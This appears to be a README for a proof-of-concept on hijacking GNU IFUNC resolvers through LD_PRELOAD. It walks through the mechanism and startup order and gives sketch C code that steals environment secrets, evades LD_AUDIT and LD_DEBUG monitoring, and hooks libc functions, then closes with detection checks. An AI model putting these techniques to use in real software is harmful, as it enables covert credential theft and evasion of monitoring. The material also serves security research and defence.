# Part 10: IFUNC Resolver Hijacking - The Earliest Code Execution

## Overview

GNU IFUNC (Indirect Function) is a mechanism that allows runtime selection of function implementations. A **resolver function** chooses which implementation to use based on runtime conditions (e.g., CPU features).

The critical insight for attackers: **The resolver runs during dynamic linking**, making it the **earliest possible user-space code execution point** - even earlier than:
- LD_AUDIT's la_preinit
- LD_PRELOAD constructors
- Library constructors
- Program constructors
- main()

---

## How IFUNC Works

### The Mechanism

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         IFUNC MECHANISM                                     │
└─────────────────────────────────────────────────────────────────────────────┘

  Normal Function:
  ─────────────────────────────────────────────────────────────────
    call printf  →  GOT[printf]  →  printf implementation

  IFUNC Function:
  ─────────────────────────────────────────────────────────────────
    call memcpy  →  GOT[memcpy]  →  ??? (chosen at runtime)
                                      │
                During linking:       │
                    memcpy_resolver() ─┘
                          │
                          ├─ CPU has AVX512? → memcpy_avx512
                          ├─ CPU has AVX?    → memcpy_avx
                          ├─ CPU has SSE4?   → memcpy_sse4
                          └─ Fallback        → memcpy_generic
```

### Declaration Syntax

```c
/* Multiple implementations */
static int func_fast(int x) { return x << 1; }     /* Optimized */
static int func_slow(int x) { return x * 2; }      /* Fallback */

/* Resolver - called during linking to choose implementation */
static void *func_resolver(void) {
    if (cpu_has_feature()) {
        return func_fast;
    }
    return func_slow;
}

/* IFUNC declaration - func() will call whatever resolver returns */
int func(int x) __attribute__((ifunc("func_resolver")));
```

### ELF Representation

```
Symbol Table Entry for IFUNC:
─────────────────────────────────────────────────────────────────
  Name:    memcpy
  Type:    STT_GNU_IFUNC      ← Special type indicating IFUNC
  Value:   Address of resolver function

When linker sees STT_GNU_IFUNC:
  1. Call the resolver function
  2. Store returned address in GOT
  3. Future calls go directly to chosen implementation
```

---

## Attack Technique: Resolver Code Execution

### The Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    IFUNC ATTACK EXECUTION FLOW                              │
└─────────────────────────────────────────────────────────────────────────────┘

  LD_PRELOAD=./evil_ifunc.so ./victim
                │
                ▼
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  Dynamic Linker (ld.so)                                                 │
  │                                                                         │
  │  1. Load evil_ifunc.so (from LD_PRELOAD)                               │
  │                                                                         │
  │  2. Process symbols...                                                  │
  │     Found: getenv with type STT_GNU_IFUNC                              │
  │            │                                                            │
  │            ▼                                                            │
  │     ┌─────────────────────────────────────────────────────────────┐    │
  │     │  CALL getenv_resolver()  ← ATTACK CODE RUNS HERE!           │    │
  │     │                                                             │    │
  │     │  • Steal environment variables                              │    │
  │     │  • Detect security tools                                    │    │
  │     │  • Establish persistence                                    │    │
  │     │  • Return address of hooked getenv                          │    │
  │     └─────────────────────────────────────────────────────────────┘    │
  │                                                                         │
  │  3. Run la_preinit (if LD_AUDIT)     ← Resolver already ran!           │
  │  4. Run LD_PRELOAD constructors      ← Resolver already ran!           │
  │  5. Run library constructors                                            │
  │  6. Run program constructors                                            │
  │  7. Call main()                                                         │
  └─────────────────────────────────────────────────────────────────────────┘
```

### Implementation

```c
/* evil_ifunc.c */

/* Attack payload - runs in resolver */
static void attack_payload(void) {
    /* This runs during symbol resolution! */

    /* Steal secrets before any sanitization */
    char *key = getenv("API_KEY");
    exfiltrate(key);

    /* Detect security tools */
    if (getenv("LD_AUDIT")) {
        /* Being monitored - act normal */
    }
}

/* Hook implementation */
static char *evil_getenv(const char *name) {
    static char *(*real)(const char *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "getenv");

    /* Log sensitive lookups */
    log_if_sensitive(name);

    return real(name);
}

/* Resolver - THIS IS WHERE ATTACK RUNS */
static void *getenv_resolver(void) {
    attack_payload();  /* EARLIEST EXECUTION! */
    return evil_getenv;
}

/* IFUNC declaration - shadows libc's getenv */
char *getenv(const char *) __attribute__((ifunc("getenv_resolver")));
```

---

## Execution Order Comparison

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    COMPLETE EXECUTION ORDER                                 │
│                    (Earliest to Latest)                                     │
└─────────────────────────────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────┐
  │ 1. IFUNC RESOLVERS                      │  ← EARLIEST (during linking)
  │    Runs as symbols are resolved         │
  │    Even before LD_AUDIT callbacks!      │
  └─────────────────────────────────────────┘
                    ↓
  ┌─────────────────────────────────────────┐
  │ 2. LD_AUDIT la_preinit                  │  ← Before constructors
  │    But AFTER resolver execution         │
  └─────────────────────────────────────────┘
                    ↓
  ┌─────────────────────────────────────────┐
  │ 3. LD_PRELOAD constructors              │
  │    __attribute__((constructor))         │
  └─────────────────────────────────────────┘
                    ↓
  ┌─────────────────────────────────────────┐
  │ 4. Library .init_array                  │
  │    Shared library constructors          │
  └─────────────────────────────────────────┘
                    ↓
  ┌─────────────────────────────────────────┐
  │ 5. Program .init_array                  │
  │    Main executable constructors         │
  └─────────────────────────────────────────┘
                    ↓
  ┌─────────────────────────────────────────┐
  │ 6. main()                               │
  │    Program entry point                  │
  └─────────────────────────────────────────┘
```

---

## IFUNC in glibc

glibc uses IFUNC extensively for CPU-optimized functions:

```bash
$ objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep IFUNC | head -10

0000000000091020 g   iD  .text  0000000000000233  GLIBC_2.2.5 memcpy
0000000000095a90 g   iD  .text  000000000000009b  GLIBC_2.2.5 memset
0000000000091700 g   iD  .text  00000000000000a3  GLIBC_2.2.5 memmove
0000000000093b00 g   iD  .text  0000000000000037  GLIBC_2.2.5 strcmp
0000000000092fe0 g   iD  .text  0000000000000039  GLIBC_2.2.5 strlen
...
```

### Common IFUNC Functions

| Function | Purpose | Optimizations |
|----------|---------|---------------|
| memcpy | Memory copy | SSE2, SSSE3, AVX, AVX512 |
| memset | Memory set | Vectorized implementations |
| memmove | Overlapping copy | Various CPU-specific |
| strcmp | String compare | SSE4.2, AVX2 |
| strlen | String length | Vectorized |
| strcpy | String copy | SIMD optimized |

---

## Attack Scenarios

### Scenario 1: Earliest Secret Theft

```c
/* In resolver - runs before ANY defenses initialize */
static void *getenv_resolver(void) {
    /* Steal secrets NOW, before:
     *   - Security tools initialize
     *   - Environment is sanitized
     *   - Logging starts
     */
    extern char **environ;
    for (char **env = environ; *env; env++) {
        if (strstr(*env, "KEY") || strstr(*env, "SECRET")) {
            exfiltrate(*env);
        }
    }

    return hooked_getenv;
}
```

### Scenario 2: Security Tool Evasion

```c
static void *puts_resolver(void) {
    /* Check if being analyzed BEFORE any tools initialize */
    if (getenv("LD_DEBUG") || getenv("LD_AUDIT")) {
        /* Return normal implementation - appear benign */
        return dlsym(RTLD_NEXT, "puts");
    }

    /* Not monitored - return malicious version */
    return evil_puts;
}
```

### Scenario 3: Pre-emptive Hook Installation

```c
static void *malloc_resolver(void) {
    /* Install memory hooks before any allocator
     * instrumentation can be set up
     */

    /* Get real malloc */
    void *real = dlsym(RTLD_NEXT, "malloc");

    /* Set up our tracking */
    init_memory_tracking();

    return our_malloc_wrapper;
}
```

---

## Comparison with Other Techniques

| Technique | Execution Point | Code Location |
|-----------|-----------------|---------------|
| **IFUNC Resolver** | During symbol resolution | Resolver function |
| LD_AUDIT la_preinit | After symbol resolution | Audit library |
| LD_PRELOAD constructor | After la_preinit | Preload library |
| Library constructor | After LD_PRELOAD | Shared library |
| Program constructor | Before main | Main executable |
| main() | Program start | Main executable |

### When to Use IFUNC

```
Use IFUNC when:
  ✓ Need EARLIEST possible execution
  ✓ Want to run before LD_AUDIT detects you
  ✓ Need to hook before security tools initialize
  ✓ Want to steal secrets before sanitization

Use constructors when:
  ✓ Full libc is needed
  ✓ Complex initialization required
  ✓ Don't need earliest execution

Use LD_AUDIT when:
  ✓ Need to intercept library loading
  ✓ Want symbol binding visibility
  ✓ Full libc available
```

---

## Limitations

1. **Limited libc availability** - Resolver runs early, some libc functions may not work
2. **Can't use printf/fprintf** - Use write() for output
3. **dlsym requires care** - May not work in resolver for all symbols
4. **SUID binaries** - LD_PRELOAD ignored, can't load our IFUNC library

---

## Detection Methods

### Static Analysis

```bash
# Find IFUNC symbols in a library
objdump -T library.so | grep "iD"

# Check for suspicious IFUNC symbols
readelf -s library.so | grep IFUNC
```

### Runtime Detection

```c
/* Check for unexpected IFUNC in loaded libraries */
dl_iterate_phdr(callback, NULL);

/* In callback, check each library's symbols */
/* Alert if non-standard IFUNC symbols found */
```

### Monitor LD_PRELOAD

```bash
# Check for IFUNC in preloaded libraries
for lib in $LD_PRELOAD; do
    objdump -T "$lib" 2>/dev/null | grep -q "iD" && \
        echo "WARNING: IFUNC in $lib"
done
```

---

## Files in This POC

| File | Description |
|------|-------------|
| `ifunc_explorer.c` | Demonstrates IFUNC mechanism |
| `evil_ifunc.c` | IFUNC hijacking library |
| `resolver_attack.c` | Resolver-based attack demo |
| `victim.c` | Target program |
| `Makefile` | Build and run demonstrations |

## Building and Running

```bash
# Build all components
make all

# Run full demonstration
make demo

# Individual demonstrations
make explore     # Explore IFUNC mechanism
make normal      # Run without hijacking
make hijack      # IFUNC hijacking demo
make attack      # Resolver attack demo
make show-glibc-ifunc  # Show glibc IFUNC symbols

# Clean up
make clean
```

---

## Key Takeaways

1. **IFUNC resolvers are THE EARLIEST** - Run during symbol resolution, before everything else

2. **Resolver code runs before la_preinit** - Even LD_AUDIT can't see resolver execution

3. **Limited but powerful** - Can't use all libc, but can steal secrets and set up hooks

4. **Shadows any function** - Create IFUNC with same name, preload, resolver runs first

5. **Hard to detect** - Runs so early that most monitoring isn't initialized yet

6. **Same SUID limitation** - LD_PRELOAD ignored for setuid binaries

7. **glibc uses extensively** - memcpy, strlen, etc. all use IFUNC for optimization
